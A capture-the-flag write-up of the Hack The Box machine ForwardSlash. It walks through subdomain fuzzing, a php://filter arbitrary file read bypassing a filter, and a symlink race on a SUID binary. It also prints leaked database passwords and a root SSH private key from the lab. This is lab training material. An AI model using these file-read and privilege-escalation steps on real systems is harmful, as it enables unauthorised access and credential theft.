---
title: "ForwardSlash - HackTheBox"
date: "2020-07-04"
tags: [HackTheBox, LFI, SSRF, WAF, Arbitrary-file-read]
---

![](https://res.cloudinary.com/dytfhf4l8/image/upload/blog/hackthebox/forwardslash/info.png)

ForwardSlash is a hard machine on Hack The Box in which we'll exploit an
arbitrary file read vulnerability in order to have a low privilege shell,
reverse an encryption script to switch to another user. To become root we'll
exploit a SUID executable that will get us a password for an encrypted backup
that contains a SSH key.

## Initial foothold
As usual, let's start with a quick port scan:
```
$ nmap -A -T4 10.10.10.183
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-07 11:21 EDT
Nmap scan report for 10.10.10.183
Host is up (0.052s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 3c:3b:eb:54:96:81:1d:da:d7:96:c7:0f:b4:7e:e1:cf (RSA)
|   256 f6:b3:5f:a2:59:e3:1e:57:35:36:c3:fe:5e:3d:1f:66 (ECDSA)
|_  256 1b:de:b8:07:35:e8:18:2c:19:d8:cc:dd:77:9c:f2:5e (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Did not follow redirect to http://forwardslash.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Visiting the web server redirects us to `forwardslash.htb`, so let's add it to
`/etc/hosts` in order to visit it:
![](https://res.cloudinary.com/dytfhf4l8/image/upload/blog/hackthebox/forwardslash/web.png)

A quick fuzz on the web server allows us to find a file:
```
```

This is `http://forwardslash.htb/note.txt`:
```
Pain, we were hacked by some skids that call themselves the "Backslash Gang"... I know... That name... 
Anyway I am just leaving this note here to say that we still have that backup site so we should be fine.

-chiv
```

Also, fuzzing the `Host` header allows us to find a subdomain:
```
$ ffuf -c -r -fc 403 -ac -w subdomains-top1million-5000.txt -H 'Host: FUZZ.forwardslash.htb' -u http://forwardslash.htb

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.1.0-git
________________________________________________

 :: Method           : GET
 :: URL              : http://forwardslash.htb
 :: Header           : Host: FUZZ.forwardslash.htb
 :: Follow redirects : true
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response status: 403
 :: Filter           : Response size: 1695
 :: Filter           : Response words: 207
 :: Filter           : Response lines: 42
________________________________________________

backup                  [Status: 200, Size: 1267, Words: 336, Lines: 40]
```

Lets visit `backup.forwardslash.htb`:
![](https://res.cloudinary.com/dytfhf4l8/image/upload/blog/hackthebox/forwardslash/login.png)

## Further exploration

As we can register, let's do it! This is the dashboard after logging in:
![](https://res.cloudinary.com/dytfhf4l8/image/upload/blog/hackthebox/forwardslash/dashboard.png)

The change profile picture functionality uses a form:
![](https://res.cloudinary.com/dytfhf4l8/image/upload/blog/hackthebox/forwardslash/change-pic.png)

But trying to click on it to write something does not work because, as we can
see in the code, the form is disabled:
```html
<form action="/profilepicture.php" method="post">
        URL:
        <input type="text" name="url" disabled style="width:600px"><br>
        <input style="width:200px" type="submit" value="Submit" disabled>
</form>
```

When a functionality is disabled client-side, you should always check if it's
also been disabled server-side, so let's modify the HTML using the console to
remove the `disabled` option and reactivate the form functionality.

## Arbitrary file read

We can start a web server with `python -m http.server 1337` and use the form
to try make a request to it:
![](https://res.cloudinary.com/dytfhf4l8/image/upload/blog/hackthebox/forwardslash/request.png)

Lets check the web server:
```
$ python3 -m http.server 1337
Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
10.10.10.183 - - [07/Apr/2020 13:05:59] "GET / HTTP/1.0" 200 -
```

And we received the request! And the strange thing is that the request response is embedded in
the response page:
![](https://res.cloudinary.com/dytfhf4l8/image/upload/blog/hackthebox/forwardslash/listing.png)

At first I thought it was gonna be a RFI, but after a bit I tried to do a
request to `index.php` and this was the result:
![](https://res.cloudinary.com/dytfhf4l8/image/upload/blog/hackthebox/forwardslash/index-exfil.png)

There's probably some kind of WAF preventing arbitrary file read, so we can try
to use `php://filter` to encode the page before it gets sent, in order to bypass
the WAF:
![](https://res.cloudinary.com/dytfhf4l8/image/upload/blog/hackthebox/forwardslash/base64-exfil.png)

## Bypassing the "WAF"

It works! Now we could manually decode the string each time, or we can write a
little script to make our life easier:
```bash
#!/usr/bin/env bash
curl -s -k -X $'POST' \
    -H 'Cookie: PHPSESSID=8qiu4kr68c7j2ir7439ia2mt4t'\
    -d "url=php://filter/convert.base64-encode/resource=${1}" \
    'http://backup.forwardslash.htb/profilepicture.php' 2>&1 | cut -z --complement -c 1-689 | base64 -i -d
```

`cut` is used to remove the `profilepicture.php` page and only keep the desired
output.

Now we can use the script to read any page, for example `./read.sh
profilepicture.php` gives us:
```php
<?php
// Initialize the session
session_start();

// Check if the user is logged in, if not then redirect him to login page
if(!isset($_SESSION["loggedin"]) || $_SESSION["loggedin"] !== true){
    header("location: login.php");
    exit;
}
/*
if (isset($_GET['success'])){
        echo <h1>Profile Picture Change Successfully!</h1>;
        exit;
}
*/
?>
<!DOCTYPE html>
<head>
    <meta charset="UTF-8">
    <title>Welcome</title>
    <link rel="stylesheet" href="bootstrap.css">
    <style type="text/css">
        body{ font: 14px sans-serif; text-align: center; }
    </style>
</head>
<body>
    <div class="page-header">
        <h1>Change your Profile Picture!</h1>
        <font style="color:red">This has all been disabled while we try to get back on our feet after the hack.<br><b>-Pain</b></font>
    </div>
<form action="/profilepicture.php" method="post">
        URL:
        <input type="text" name="url" disabled style="width:600px"><br>
        <input style="width:200px" type="submit" value="Submit" disabled>
</form>
</body>
</html>
<?php
if (isset($_POST['url'])) {
        $url = 'http://backup.forwardslash.htb/api.php';
        $data = array('url' => $_POST['url']);

        $options = array(
                'http' => array(
                        'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
                        'method'  => 'POST',
                        'content' => http_build_query($data)
                )
        );
        $context = stream_context_create($options);
        $result = file_get_contents($url, false, $context);
        echo $result;
        exit;
}
?>
```

`api.php` seems interesting, let's check it:
{{< highlight php "linenos=table" >}}
<?php

session_start();

if (isset($_POST['url'])) {

        if((!isset($_SESSION["loggedin"]) || $_SESSION["loggedin"] !== true) && $_SERVER['REMOTE_ADDR'] !== "127.0.0.1"){
                echo "User must be logged in to use API";
                exit;
        }

        $picture = explode("-----output-----<br>", file_get_contents($_POST['url']));
        if (strpos($picture[0], "session_start();") !== false) {
                echo "Permission Denied; not that way ;)";
                exit;
        }
        echo $picture[0];
        exit;
}
?>
<!-- TODO: removed all the code to actually change the picture after backslash gang attacked us, simply echos as debug now -->
{{</ highlight >}}

At line 13 there's the check that was preventing the data exfiltration, and as
we can see, at line 17 it just echoes the result of `file_get_contents`, but
there's not much more there.

While visiting the other file such as `register.php`, I saw that all of them
included one file called `config.php` that probably contains helper functions,
so let's read it:
```php
<?php
//credentials for the temp db while we recover, had to backup old config, didn't want it getting compromised -pain
define('DB_SERVER', 'localhost');
define('DB_USERNAME', 'www-data');
define('DB_PASSWORD', '5iIwJX0C2nZiIhkLYE7n314VcKNx8uMkxfLvCTz2USGY180ocz3FQuVtdCy3dAgIMK3Y8XFZv9fBi6OwG6OYxoAVnhaQkm7r2ec');
define('DB_NAME', 'site');

/* Attempt to connect to MySQL database */
$link = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);

// Check connection
if($link === false){
    die("ERROR: Could not connect. " . mysqli_connect_error());
}
?>
```

We have some credentials! But here I was stuck for quite a bit as I can't seem
to use them anywhere. After a long pause I came back to the machine and it took
me hours to finally make it to the next step. So frustrating when you don't have
any clues about what to do.

## First shell

I started fuzzing for files and I found a folder named `dev`:
```
$ ffuf -nb -c -r -fs 410 -w /usr/share/wordlists/raft-large-directories-lowercase.txt -X POST -H 'Accept-Encoding: gzip, deflate' -H 'Content-Type: application/x-www-form-urlencoded' -b "PHPSESSID=8qiu4kr68c7j2ir7439ia2mt4t" -d 'url=php://filter/read=string.rot13/resource=FUZZ/index.php' -u http://backup.forwardslash.htb/profilepicture.php
dev                     [Status: 200, Size: 1452, Words: 5, Lines: 7]
```

So let's read the file in it with `./read.sh dev/index.php`:
```php
<?php
//include_once ../session.php;
// Initialize the session
session_start();

if((!isset($_SESSION["loggedin"]) || $_SESSION["loggedin"] !== true || $_SESSION['username'] !== "admin") && $_SERVER['REMOTE_ADDR'] !== "127.0.0.1"){
    header('HTTP/1.0 403 Forbidden');
    echo "<h1>403 Access Denied</h1>";
    echo "<h3>Access Denied From ", $_SERVER['REMOTE_ADDR'], "</h3>";
    //echo "<h2>Redirecting to login in 3 seconds</h2>"
    //echo '<meta http-equiv="refresh" content="3;url=../login.php" />';
    //header("location: ../login.php");
    exit;
}
?>
<html>
        <h1>XML Api Test</h1>
        <h3>This is our api test for when our new website gets refurbished</h3>
        <form action="/dev/index.php" method="get" id="xmltest">
                <textarea name="xml" form="xmltest" rows="20" cols="50"><api>
    <request>test</request>
</api>
</textarea>
                <input type="submit">
        </form>

</html>

<!-- TODO:
Fix FTP Login
-->

<?php
if ($_SERVER['REQUEST_METHOD'] === "GET" && isset($_GET['xml'])) {

        $reg = '/ftp:\/\/[\s\S]*\/\"/';
        //$reg = '/((((25[0-5])|(2[0-4]\d)|([01]?\d?\d)))\.){3}((((25[0-5])|(2[0-4]\d)|([01]?\d?\d))))/'

        if (preg_match($reg, $_GET['xml'], $match)) {
                $ip = explode('/', $match[0])[2];
                echo $ip;
                error_log("Connecting");

                $conn_id = ftp_connect($ip) or die("Couldn't connect to $ip\n");

                error_log("Logging in");

                if (@ftp_login($conn_id, "chiv", 'N0bodyL1kesBack/')) {

                        error_log("Getting file");
                        echo ftp_get_string($conn_id, "debug.txt");
                }

                exit;
        }

        libxml_disable_entity_loader (false);
        $xmlfile = $_GET["xml"];
        $dom = new DOMDocument();
        $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
        $api = simplexml_import_dom($dom);
        $req = $api->request;
        echo "-----output-----<br>\r\n";
        echo "$req";
}

function ftp_get_string($ftp, $filename) {
    $temp = fopen('php://temp', 'r+');
    if (@ftp_fget($ftp, $temp, $filename, FTP_BINARY, 0)) {
        rewind($temp);
        return stream_get_contents($temp);
    }
    else {
        return false;
    }
}

?>
```

I think the XML part is just another rabbit hole, the important thing is that
there is chiv's password, `N0bodyL1kesBack/`, so let's try it on ssh:

```
$ ssh chiv@10.10.10.183                                                                 [master✚1…]
The authenticity of host '10.10.10.183 (10.10.10.183)' can't be established.
ECDSA key fingerprint is SHA256:7DrtoyB3GmTDLmPm01m7dHeoaPjA7+ixb3GDFhGn0HM.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.183' (ECDSA) to the list of known hosts.
chiv@10.10.10.183's password:
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Jul  4 01:28:01 UTC 2020

  System load:  0.0                Processes:            167
  Usage of /:   30.6% of 19.56GB   Users logged in:      0
  Memory usage: 13%                IP address for ens33: 10.10.10.183
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

16 packages can be updated.
0 updates are security updates.


Last login: Tue Mar 24 11:34:37 2020 from 10.10.14.3
chiv@forwardslash:~$
```

## `chiv` to `pain` escalation

Looks like we're in! The home folder does not contain anything useful, but
on the other hand, `/home/pain` does:
```
chiv@forwardslash:/home$ ls pain/
encryptorinator  note.txt  user.txt
```

Lets check `note.txt`:
```
Pain, even though they got into our server, I made sure to encrypt any important files and then did some crypto magic on the key... I gave you the key in person the other day, so unless these hackers are some crypto experts we should be good to go.

-chiv
```

The `encryptorinator` folder contains an encrypted file and a script:
```python
def encrypt(key, msg):
    key = list(key)
    msg = list(msg)
    for char_key in key:
        for i in range(len(msg)):
            if i == 0:
                tmp = ord(msg[i]) + ord(char_key) + ord(msg[-1])
            else:
                tmp = ord(msg[i]) + ord(char_key) + ord(msg[i-1])

            while tmp > 255:
                tmp -= 256
            msg[i] = chr(tmp)
    return ''.join(msg)

def decrypt(key, msg):
    key = list(key)
    msg = list(msg)
    for char_key in reversed(key):
        for i in reversed(range(len(msg))):
            if i == 0:
                tmp = ord(msg[i]) - (ord(char_key) + ord(msg[-1]))
            else:
                tmp = ord(msg[i]) - (ord(char_key) + ord(msg[i-1]))
            while tmp < 0:
                tmp += 256
            msg[i] = chr(tmp)
    return ''.join(msg)


print encrypt('REDACTED', 'REDACTED')
print decrypt('REDACTED', encrypt('REDACTED', 'REDACTED'))
```

At first I tried to reason about vulnerabilities in the cipher, but then I just
went for a quick dictionary attack by trying to decrypt using the rockyou
wordlist and print the result if it was composed by at least 60% of letters:
```python
encrypted = open('ciphertext', 'r', encoding='latin1').read()
for key in open('rockyou.txt', 'r', encoding='latin1'):
    key = key.strip()
    dec = decrypt(key, encrypted)
    char_count = sum(map(lambda x : 1 if x in string.ascii_letters else 0, dec))
    if char_count / len(dec) >= .6:
        print(dec)
```

And using `teamareporsiempre` as the key, this is the result:
```
$ ./encryptor.py
³j%ÿ   9½[ÎlOyorSÔaé[8vá[(ý;fryption tool, pretty secure huh, anyway here is the key to the encrypted image from /var/backups/recovery: cB!6%sdH8Lj^@Y*$C2cf
```

But we don't have access to `/var/backups/recovery`:
```
chiv@forwardslash:~/encryptorinator$ ls -ld /var/backups/recovery/
drwxrwx--- 2 root backupoperator 4096 May 27  2019 /var/backups/recovery/
```

If we search for SUID executables, we find that we can run `/usr/bin/backup` as
user `pain`:
```
$ find / -perm -4000 -exec ls -ldb {} \; 2>/dev/null
-rwsr-xr-x 1 root root 30800 Aug 11  2016 /bin/fusermount
-rwsr-xr-x 1 root root 43088 Jan  8 18:31 /bin/mount
-rwsr-xr-x 1 root root 64424 Jun 28  2019 /bin/ping
-rwsr-xr-x 1 root root 26696 Jan  8 18:31 /bin/umount
-rwsr-xr-x 1 root root 44664 Mar 22  2019 /bin/su
-rwsr-xr-x 1 root root 40152 Oct 10  2019 /snap/core/8268/bin/mount
-rwsr-xr-x 1 root root 44168 May  7  2014 /snap/core/8268/bin/ping
-rwsr-xr-x 1 root root 44680 May  7  2014 /snap/core/8268/bin/ping6
-rwsr-xr-x 1 root root 40128 Mar 25  2019 /snap/core/8268/bin/su
-rwsr-xr-x 1 root root 27608 Oct 10  2019 /snap/core/8268/bin/umount
-rwsr-xr-x 1 root root 71824 Mar 25  2019 /snap/core/8268/usr/bin/chfn
-rwsr-xr-x 1 root root 40432 Mar 25  2019 /snap/core/8268/usr/bin/chsh
-rwsr-xr-x 1 root root 75304 Mar 25  2019 /snap/core/8268/usr/bin/gpasswd
-rwsr-xr-x 1 root root 39904 Mar 25  2019 /snap/core/8268/usr/bin/newgrp
-rwsr-xr-x 1 root root 54256 Mar 25  2019 /snap/core/8268/usr/bin/passwd
-rwsr-xr-x 1 root root 136808 Oct 11  2019 /snap/core/8268/usr/bin/sudo
-rwsr-xr-- 1 root systemd-resolve 42992 Jun 10  2019 /snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 428240 Mar  4  2019 /snap/core/8268/usr/lib/openssh/ssh-keysign
-rwsr-sr-x 1 root root 106696 Dec  6  2019 /snap/core/8268/usr/lib/snapd/snap-confine
-rwsr-xr-- 1 root dip 394984 Jun 12  2018 /snap/core/8268/usr/sbin/pppd
-rwsr-xr-x 1 root root 40152 Jan 27 14:28 /snap/core/8689/bin/mount
-rwsr-xr-x 1 root root 44168 May  7  2014 /snap/core/8689/bin/ping
-rwsr-xr-x 1 root root 44680 May  7  2014 /snap/core/8689/bin/ping6
-rwsr-xr-x 1 root root 40128 Mar 25  2019 /snap/core/8689/bin/su
-rwsr-xr-x 1 root root 27608 Jan 27 14:28 /snap/core/8689/bin/umount
-rwsr-xr-x 1 root root 71824 Mar 25  2019 /snap/core/8689/usr/bin/chfn
-rwsr-xr-x 1 root root 40432 Mar 25  2019 /snap/core/8689/usr/bin/chsh
-rwsr-xr-x 1 root root 75304 Mar 25  2019 /snap/core/8689/usr/bin/gpasswd
-rwsr-xr-x 1 root root 39904 Mar 25  2019 /snap/core/8689/usr/bin/newgrp
-rwsr-xr-x 1 root root 54256 Mar 25  2019 /snap/core/8689/usr/bin/passwd
-rwsr-xr-x 1 root root 136808 Jan 31 18:37 /snap/core/8689/usr/bin/sudo
-rwsr-xr-- 1 root systemd-resolve 42992 Nov 29  2019 /snap/core/8689/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 428240 Mar  4  2019 /snap/core/8689/usr/lib/openssh/ssh-keysign
-rwsr-sr-x 1 root root 106696 Feb 12 16:34 /snap/core/8689/usr/lib/snapd/snap-confine
-rwsr-xr-- 1 root dip 394984 Jun 12  2018 /snap/core/8689/usr/sbin/pppd
-rwsr-xr-x 1 root root 149080 Jan 31 17:18 /usr/bin/sudo
-rwsr-xr-x 1 root root 22520 Mar 27  2019 /usr/bin/pkexec
-rwsr-xr-x 1 root root 59640 Mar 22  2019 /usr/bin/passwd
-rwsr-xr-x 1 root root 40344 Mar 22  2019 /usr/bin/newgrp
-rwsr-xr-x 1 root root 75824 Mar 22  2019 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 18448 Jun 28  2019 /usr/bin/traceroute6.iputils
-rwsr-xr-x 1 root root 76496 Mar 22  2019 /usr/bin/chfn
-rwsr-xr-x 1 root root 44528 Mar 22  2019 /usr/bin/chsh
-rwsr-sr-x 1 daemon daemon 51464 Feb 20  2018 /usr/bin/at
-rwsr-xr-x 1 root root 37136 Mar 22  2019 /usr/bin/newuidmap
-r-sr-xr-x 1 pain pain 13384 Mar  6 10:06 /usr/bin/backup
-rwsr-xr-x 1 root root 37136 Mar 22  2019 /usr/bin/newgidmap
-rwsr-sr-x 1 root root 109432 Oct 30  2019 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root 100760 Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 436552 Mar  4  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 42992 Jun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 14328 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
```
Let's try to run it:
```
chiv@forwardslash:~$ /usr/bin/backup
----------------------------------------------------------------------
        Pain's Next-Gen Time Based Backup Viewer
        v0.1
        NOTE: not reading the right file yet,
        only works if backup is taken in same second
----------------------------------------------------------------------

Current Time: 02:13:40
ERROR: 4d6b6a6eb03c1a1cce725cd145f049f9 Does Not Exist or Is Not Accessible By Me, Exiting...
```

Running it again we can see that the hash changes everytime:
```
chiv@forwardslash:~$ /usr/bin/backup
----------------------------------------------------------------------
        Pain's Next-Gen Time Based Backup Viewer
        v0.1
        NOTE: not reading the right file yet,
        only works if backup is taken in same second
----------------------------------------------------------------------

Current Time: 02:14:26
ERROR: ef0047e7b12c4af8e84146f754ac9275 Does Not Exist or Is Not Accessible By Me, Exiting...
```

It looks like the executable is trying to read a file names as the hash that it
prints. We can use some bash magic to run the script, get the hash, create a
link to a file that we want to read that the user `pain` can read, and re-run
the script. If it all happens within the same second, we'll be able to read
files as `pain`!

## Arbitrary file read as `pain`
Let's try:
```
chiv@forwardslash:~$ name=$(/usr/bin/backup | tail -n 1 | cut -d ' ' -f 2); ln -s /var/backups/config.php.bak $name; /usr/bin/backup
----------------------------------------------------------------------
        Pain's Next-Gen Time Based Backup Viewer
        v0.1
        NOTE: not reading the right file yet,
        only works if backup is taken in same second
----------------------------------------------------------------------

Current Time: 2:16:20
<?php
/* Database credentials. Assuming you are running MySQL
server with default setting (user 'root' with no password) */
define('DB_SERVER', 'localhost');
define('DB_USERNAME', 'pain');
define('DB_PASSWORD', 'db1f73a72678e857d91e71d2963a1afa9efbabb32164cc1d94dbc704');
define('DB_NAME', 'site');

/* Attempt to connect to MySQL database */
$link = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);

// Check connection
if($link === false){
    die("ERROR: Could not connect. " . mysqli_connect_error());
}
?>
```

Lets try to use the password to become `chiv`:
```
chiv@forwardslash:~$ su pain
Password:
pain@forwardslash:/home/chiv$
```

And let's get the flag:
```
pain@forwardslash:/home/chiv$ wc -c ~/user.txt
33 /home/pain/user.txt
```

## Privilege escalation

During the normal enumeration steps, I found out that `pain` is in the
`backupoperator` group:
```
pain@forwardslash:~/encryptorinator$ groups
pain backupoperator
```

So lets explore `/var/backups/recovery`:
```
pain@forwardslash:~/encryptorinator$ ls /var/backups/recovery/
encrypted_backup.img
```

`encrypted_backup.img` is a LUKS encrypted file:
```
pain@forwardslash:/var/backups/recovery$ file encrypted_backup.img
encrypted_backup.img: LUKS encrypted file, ver 1 [aes, xts-plain64, sha256] UUID: f2a0906a-c412-48db-8c18-3b72443c1bdf
```

And we are allowed to run `cryptsetup` as root:
```
pain@forwardslash:/var/backups/recovery$ sudo -l
Matching Defaults entries for pain on forwardslash:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pain may run the following commands on forwardslash:
    (root) NOPASSWD: /sbin/cryptsetup luksOpen *
    (root) NOPASSWD: /bin/mount /dev/mapper/backup ./mnt/
    (root) NOPASSWD: /bin/umount ./mnt/
```

Let's unlock the LUKS volume using `cB!6%sdH8Lj^@Y*$C2cf`, the password found
previously in `note.txt`:
```
pain@forwardslash:/var/backups/recovery$ sudo /sbin/cryptsetup luksOpen encrypted_backup.img backup
Enter passphrase for encrypted_backup.img:
```

And after mounting it with `sudo mount /dev/mapper/backup ./mnt/`, lets inspect
it's content:
```
pain@forwardslash:/$ ls mnt
id_rsa
```

And here's the key:
```
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA9i/r8VGof1vpIV6rhNE9hZfBDd3u6S16uNYqLn+xFgZEQBZK
RKh+WDykv/gukvUSauxWJndPq3F1Ck0xbcGQu6+1OBYb+fQ0B8raCRjwtwYF4gaf
yLFcOS111mKmUIB9qR1wDsmKRbtWPPPvgs2ruafgeiHujIEkiUUk9f3WTNqUsPQc
u2AG//ZCiqKWcWn0CcC2EhWsRQhLOvh3pGfv4gg0Gg/VNNiMPjDAYnr4iVg4XyEu
NWS2x9PtPasWsWRPLMEPtzLhJOnHE3iVJuTnFFhp2T6CtmZui4TJH3pij6wYYis9
MqzTmFwNzzx2HKS2tE2ty2c1CcW+F3GS/rn0EQIDAQABAoIBAQCPfjkg7D6xFSpa
V+rTPH6GeoB9C6mwYeDREYt+lNDsDHUFgbiCMk+KMLa6afcDkzLL/brtKsfWHwhg
G8Q+u/8XVn/jFAf0deFJ1XOmr9HGbA1LxB6oBLDDZvrzHYbhDzOvOchR5ijhIiNO
3cPx0t1QFkiiB1sarD9Wf2Xet7iMDArJI94G7yfnfUegtC5y38liJdb2TBXwvIZC
vROXZiQdmWCPEmwuE0aDj4HqmJvnIx9P4EAcTWuY0LdUU3zZcFgYlXiYT0xg2N1p
MIrAjjhgrQ3A2kXyxh9pzxsFlvIaSfxAvsL8LQy2Osl+i80WaORykmyFy5rmNLQD
Ih0cizb9AoGBAP2+PD2nV8y20kF6U0+JlwMG7WbV/rDF6+kVn0M2sfQKiAIUK3Wn
5YCeGARrMdZr4fidTN7koke02M4enSHEdZRTW2jRXlKfYHqSoVzLggnKVU/eghQs
V4gv6+cc787HojtuU7Ee66eWj0VSr0PXjFInzdSdmnd93oDZPzwF8QUnAoGBAPhg
e1VaHG89E4YWNxbfr739t5qPuizPJY7fIBOv9Z0G+P5KCtHJA5uxpELrF3hQjJU8
6Orz/0C+TxmlTGVOvkQWij4GC9rcOMaP03zXamQTSGNROM+S1I9UUoQBrwe2nQeh
i2B/AlO4PrOHJtfSXIzsedmDNLoMqO5/n/xAqLAHAoGATnv8CBntt11JFYWvpSdq
tT38SlWgjK77dEIC2/hb/J8RSItSkfbXrvu3dA5wAOGnqI2HDF5tr35JnR+s/JfW
woUx/e7cnPO9FMyr6pbr5vlVf/nUBEde37nq3rZ9mlj3XiiW7G8i9thEAm471eEi
/vpe2QfSkmk1XGdV/svbq/sCgYAZ6FZ1DLUylThYIDEW3bZDJxfjs2JEEkdko7mA
1DXWb0fBno+KWmFZ+CmeIU+NaTmAx520BEd3xWIS1r8lQhVunLtGxPKvnZD+hToW
J5IdZjWCxpIadMJfQPhqdJKBR3cRuLQFGLpxaSKBL3PJx1OID5KWMa1qSq/EUOOr
OENgOQKBgD/mYgPSmbqpNZI0/B+6ua9kQJAH6JS44v+yFkHfNTW0M7UIjU7wkGQw
ddMNjhpwVZ3//G6UhWSojUScQTERANt8R+J6dR0YfPzHnsDIoRc7IABQmxxygXDo
ZoYDzlPAlwJmoPQXauRl1CgjlyHrVUTfS0AkQH2ZbqvK5/Metq8o
-----END RSA PRIVATE KEY-----
```

After saving it locally, lets try to use it to login as root:
```
$ ssh -i key root@forwardslash.htb
The authenticity of host 'forwardslash.htb (10.10.10.183)' can't be established.
ECDSA key fingerprint is SHA256:7DrtoyB3GmTDLmPm01m7dHeoaPjA7+ixb3GDFhGn0HM.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'forwardslash.htb,10.10.10.183' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Jul  4 02:32:00 UTC 2020

  System load:  0.0                Processes:            195
  Usage of /:   30.8% of 19.56GB   Users logged in:      1
  Memory usage: 19%                IP address for ens33: 10.10.10.183
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

16 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue Mar 24 12:11:46 2020 from 10.10.14.3
root@forwardslash:~#
```

And we're in! Lets see if we can read the flag:
```
root@forwardslash:~# wc -c root.txt
33 root.txt
```

That's all! Thanks for reading!
